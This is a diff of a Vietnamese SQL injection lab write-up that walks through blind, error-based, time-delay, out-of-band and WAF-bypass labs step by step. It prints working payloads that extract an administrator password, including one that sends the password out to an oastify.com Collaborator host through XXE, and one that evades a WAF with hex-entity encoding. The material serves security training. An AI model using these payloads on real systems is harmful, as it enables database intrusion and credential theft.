@@ -28,7 +28,7 @@ Có thể phát hiện SQLi theo cách thủ công bằng cách:
   
 ---
 
-#### 2.1 Trong các phần khác nhau của truy vấn
+#### 2.1 Phát hiện SQLi trong các phần khác nhau của truy vấn
 - Hầu hết các lỗ hổng SQL injection đều xảy ra trong `WHERE` của một `SELECT`.
 - Trong `UPDATE`, ở các giá trị được cập nhật hoặc `WHERE`.
 - Trong `INSERT`, bên trong các giá trị được chèn vào.
@@ -280,6 +280,7 @@ Tiếp tục thay đổi giá trị để xác định độ dài của mật kh
 **Xác định được độ dài của mật khẩu, thực tế là 20 ký tự**
 
 **Xác định giá trị kí tự tại mỗi vị trí**
+
 Bước 7: Trong Intruder: 
 `TrackingId=0Ng3V1e3t5uRTDir' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
 `SUBSTRING()` để trích xuất một ký tự duy nhất từ ​​mật khẩu và kiểm tra nó với một giá trị cụ thể. Ta sẽ kiểm tra từng vị trí và giá trị có khả năng, lần lượt kiểm tra từng giá trị
@@ -311,13 +312,142 @@ Các giá trị có payload 1 thứ tự 1 đến 20 có tick `Welcome back` là
 
 📜**LAB 12: SQLI MÙ VỚI LỖI CÓ ĐIỀU KIỆN**
 
+Bước 1: Đổi thành `TrackingId=0KiBtOMaYkZKtHgZ''` để cho thấy lỗi cú pháp (trong trường hợp này là dấu ngoặc kép không đóng) đang có tác động đáng kể đến phản hồi.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bae6db23-8102-44bd-b0db-96243d68f0a0" />
+
+Bước 2: Xác định đây là lỗi cú pháp SQL chứ không phải bất kỳ loại lỗi nào khác
+`TrackingId=0KiBtOMaYkZKtHgZ'||(SELECT '' FROM dual)||'` -> điều này cho thấy mục tiêu có thể đang sử dụng cơ sở dữ liệu Oracle, yêu cầu tất cả SELECTcác câu lệnh phải chỉ định rõ ràng tên bảng.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c9b46fda-f26a-4c7b-b17f-4b1be415b660" />
+Bước 3: Xác minh trong csdl có bảng `Users`
+
+`TrackingId=0KiBtOMaYkZKtHgZ'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2c26ebbf-d680-4cb7-8745-ea8c40643f87" />
+Bước 4: Xác minh người dùng administrator có tồn tại hay không:
+
+`TrackingId=0KiBtOMaYkZKtHgZ'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` -> Có lỗi vậy có người dùng administrator
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d768a7ae-575d-438a-81cd-0784fddbe497" />
+
+Bước 5: Xác định số ký tự trong mật khẩu 
+
+`TrackingId=0KiBtOMaYkZKtHgZ'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7202901a-045c-4bc3-8a2a-eda5e41ff38f" />
+
+Tăng dần để xác định được số ký tự trong mật khẩu là **20 ký tự**
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/554568b7-2217-4a72-b4db-a091550c7a27" />
+
+**Xác định giá trị kí tự tại mỗi vị trí**
+
+ `TrackingId=0KiBtOMaYkZKtHgZ'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/77e9399e-12d8-49e9-8b73-de6684e572df" />
+Ứng dụng trả về mã trạng thái HTTP 500 khi lỗi xảy ra, và mã trạng thái HTTP 200 thông thường. Cột "Trạng thái" trong kết quả Intruder hiển thị mã trạng thái HTTP, vì vậy ta có thể dễ dàng tìm thấy hàng có giá trị 500 trong cột này
+
+**Mật khẩu là: 5eashkev2js3u58v2e00**
+
+**Trích xuất dữ liệu nhạy cảm thông qua các thông báo lỗi SQL chi tiết**
+- Khi nhập dữ liệu không hợp lệ (ví dụ thêm dấu nháy đơn vào tham số), ứng dụng có thể trả về thông báo lỗi chi tiết, hiển thị cả câu lệnh SQL. Điều này giúp kẻ tấn công hiểu rõ cấu trúc truy vấn và dễ dàng khai thác SQL Injection.
+- Thông báo lỗi cũng có thể để lộ dữ liệu từ cơ sở dữ liệu nếu kẻ tấn công cố tình gây lỗi (ví dụ dùng hàm CAST() để chuyển đổi kiểu dữ liệu không hợp lệ).
+- Khi chuyển một chuỗi sang kiểu số nguyên, cơ sở dữ liệu có thể trả về lỗi chứa chính dữ liệu đó, giúp kẻ tấn công nhìn thấy thông tin nhạy cảm.
+
+📜**LAB 13: SQLI DỰA TRÊN LỖI HIỂN THỊ**
+
+Bước 1: Thêm `'` vào `TrackingId =kKSkdvB8shlgfc4b`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7936769e-7760-4929-a13b-4b075c7676d6" />
+Ở vị trí 52 trong câu lệnh SQL, chuỗi ký tự được mở bằng dấu nháy nhưng không đóng đúng cách (''). Nó tiết lộ tên bảng, cột và cách dữ liệu được đặt trong dấu nháy, giúp kẻ tấn công biết cách chèn payload khi khai thác SQL injection dựa trên lỗi hiển thị.
+
+Bước 2: Điều chỉnh truy vấn để bao gồm một truy vấn SELECT phụ chung và chuyển đổi giá trị trả về thành một int 
+
+`TrackingId=kKSkdvB8shlgfc4b' AND CAST((SELECT 1) AS int)--`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/35cf4985-2548-4bee-8498-bbf12fec0a88" />
+Ta nhận được một lỗi khác rằng điều kiện AND là một biểu thức boolean
+-> **Truy vấn hợp lệ:** `TrackingId=kKSkdvB8shlgfc4b' AND 1=CAST((SELECT 1) AS int)--`
+
+Bước 3: Lấy tên người dùng từ cơ sở dữ liệu:
+
+`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d6ab67ca-2da7-4b64-bab2-377649dd3f0e" />
+Nghĩa là cơ sở dữ liệu đang cố gắng chuyển giá trị "administrator" sang kiểu số nguyên (integer) nhưng thất bại vì đây là chuỗi chữ -> Biết rằng đây administrator là người dùng đầu tiên trong bảng
+
+Bước 4: Lấy mật khẩu: **jfyes1q73gnxz7esjxg1**
+
+`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
+
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c352b3d9-9282-4090-8908-7bcefdd61633" />
+
+###### 2.1.5.3 Kích hoạt thời gian trễ
+- SQL Injection mù có thể khai thác bằng cách dùng độ trễ thời gian để suy ra điều kiện đúng/sai.
+- Vì ứng dụng xử lý truy vấn đồng bộ, khi truy vấn bị trì hoãn thì phản hồi HTTP cũng chậm theo, giúp xác định kết quả.
+- Có thể dùng phương pháp này để trích xuất dữ liệu từng ký tự, như kiểm tra mật khẩu quản trị viên bằng câu lệnh so sánh ký tự.
+
+📜**LAB 14: SQLI MÙ VỚI ĐỘ TRỄ THỜI GIAN**
+ Thay đổi `TrackingId` thành `TrackingId=cHy1E3pZqYfJSLEL'||pg_sleep(10)--`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a8f76539-f0d0-44b0-a65b-54f4aad7a490" />
+📜**LAB 15: SQLI MÙ VỚI ĐỘ TRỄ THỜI GIAN VÀ TRUY XUẤT THÔNG TIN**
+
+Bước 1: Thay TrackingId = `TrackingId=Ok6KWnCgfj2XJTjU'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`. Xác định ứng dụng phản hồi ngay lập tức mà ko có độ trễ 
+
+Bước 2: Đổi thành `TrackingId=Ok6KWnCgfj2XJTjU'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` để xác nhận có người dùng administrator
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ef583cac-7254-4d93-b431-c6c527714ad4" />
+Bước 3: Xác định số ký tự trong mật khẩu:
+`TrackingId=Ok6KWnCgfj2XJTjU'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+ 
+ **Xác định có 20 ký tự trong mật khẩu**
+
+`TrackingId=Ok6KWnCgfj2XJTjU'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+
+Bước 4: Làm tương tự các Lab kia. Trong Resource pool,thêm cuộc tấn công vào nhóm tài nguyên với Maximum concurrent requests được đặt thành 1 - để biết khi nào ký tự chính xác được gửi đi, ta cần theo dõi thời gian ứng dụng phản hồi từng yêu cầu. Để quá trình này đúng ta cần cấu hình cuộc tấn công Intruder để gửi yêu cầu trong một luồng duy nhất.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/808feeaf-104f-4aad-8934-9001bd21daa9" />
+Trong tab Response received thường chứa một số nhỏ, biểu thị số mili giây mà ứng dụng đã mất để phản hồi. Một trong các hàng sẽ có số lớn hơn trong cột này, khoảng 10.000 mili giây. Giá trị payload hiển thị cho hàng đó là giá trị của ký tự trong mật khẩu
+**Mật khẩu: 3gu8bjaowitku1thu2zg**
+
+###### 2.1.5.4 Kỹ thuật ngoài băng tần (OAST)
+Trong trường hợp này, kẻ tấn công thường khai thác bằng cách tạo ra tương tác mạng ngoài băng thông (out-of-band) đến hệ thống do họ kiểm soát. Phổ biến nhất là DNS, vì thường được phép tự do trong môi trường sản xuất.
+
+Burp Collaborator là công cụ hỗ trợ tốt nhất cho OAST (Out-of-band Application Security Testing), cho phép phát hiện khi payload gây ra các truy vấn DNS hoặc tương tác mạng khác.
+
+📜**LAB 16: SQLI MÙ VỚI TƯƠNG TÁC NGOÀI BĂNG TẦN**
+
+Kết hợp SQL injection với các kỹ thuật XXE cơ bản để kích hoạt tương tác với máy chủ Collaborator
+
+`TrackingId=D4y6jHchh7aruq4h'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//839gscx9qlg5tezp5sq8uiq26tck0eo3.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/28dead5c-18d5-4e5f-a00d-2c7155132dd5" />
+📜**LAB 17: SQLI MÙ VỚI VIỆC RÒ RỈ DỮ LIỆU NGOÀI BĂNG TẦN**
+
+Bước 1: Kết hợp SQL injection với các kỹ thuật XXE cơ bản để kích hoạt tương tác với máy chủ Collaborator
+`TrackingId=8OX8Shu2vWVMhigB'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.39aby734wgm0z95kbnw30dwxcoig66uv.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`
+
+Bước 2: Nhấn vào Thăm dò ngay 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9ba79b6f-b342-4051-b8df-b7ef0fed12a5" />
+- Đối với tương tác DNS, tên miền đầy đủ đã được tra cứu sẽ được hiển thị trong tab Description.
+- Đối với tương tác HTTP, tên miền đầy đủ sẽ được hiển thị trong tiêu đề Máy chủ trong tab Request to Collaborator 
+***Mật khẩu là: v1n07xu0updrfx8tzfxy***
+
 ---
 
 ##### 2.1.6 SQLi bậc 2:
 - **SQL injection cấp một (first-order)**: xảy ra ngay tại thời điểm ứng dụng nhận dữ liệu đầu vào từ người dùng và chèn trực tiếp vào truy vấn SQL không an toàn.
 - **SQL injection cấp hai (second-order)**: dữ liệu đầu vào được người dùng gửi đến và lưu trữ (thường trong cơ sở dữ liệu) mà chưa gây ra lỗi. Ở một yêu cầu khác, ứng dụng truy xuất dữ liệu đã lưu và chèn nó vào truy vấn SQL không an toàn, khi đó lỗ hổng mới xảy ra. Vì vậy còn gọi là SQL injection lưu trữ.
 
+
 --- 
+#### 2.2 Phát hiện SQLi trong các bối cảnh khác nhau
+SQL Injection không chỉ giới hạn ở query string mà có thể chèn qua mọi định dạng đầu vào được xử lý thành SQL, và có thể né bộ lọc bằng cách mã hóa hoặc thoát ký tự.
+
+📜**LAB 18: SQLI VỚI KỸ THUẬT VƯỢT QUA BỘ LỘC BẰNG MÃ HÓA XML**
+Bước 1: Thay thế ID bằng các biểu thức toán học có thể đánh giá theo các ID tiềm năng khác
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d47ab3ee-f61f-4644-93af-301c621aacaa" />
+Bước 2: Xác định số cột được trả về bởi truy vấn gốc bằng cách thêm một UNION SELECT vào ID cửa hàng gốc:
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/027e40b2-417d-4152-9c69-fc7d059af7dc" />
+Yêu cầu của bạn đã bị chặn do bị đánh dấu là có khả năng bị tấn công
+
+Bước 3: Sử dụng tiện ích Hackvertor để gửi lại yêu cầu và ta nhận được phản hồi bình thường -> Điều này đã vượt qua WAF thành công
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b76832e0-9f28-4eb1-ab99-c9fa68c66efa" />
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/820aba84-a41c-4621-a117-ffca5aed926e" />
+Bước 4: Suy ra rằng truy vấn trả về một cột duy nhất. Khi bạn cố gắng trả về nhiều hơn một cột, ứng dụng sẽ trả về lỗi 0 units .
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ec011fe3-bb6c-4001-8b36-f09aa98e8534" />
+Bước 5: Vì chỉ có thể trả về một cột nên cần nối các tên người dùng và mật khẩu được trả về: `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/67e4327e-1fd6-4705-9e0b-feda5f0c180b" />
+**Mật khẩu: l3j27vh6n4gyywn89t26**
 
 ### 3. Lỗi SQL Injection trên các hàm SELECT, INSERT, UPDATE, DELETE
 #### 3.1 Lỗi SQL Injection trên các hàm SELECT
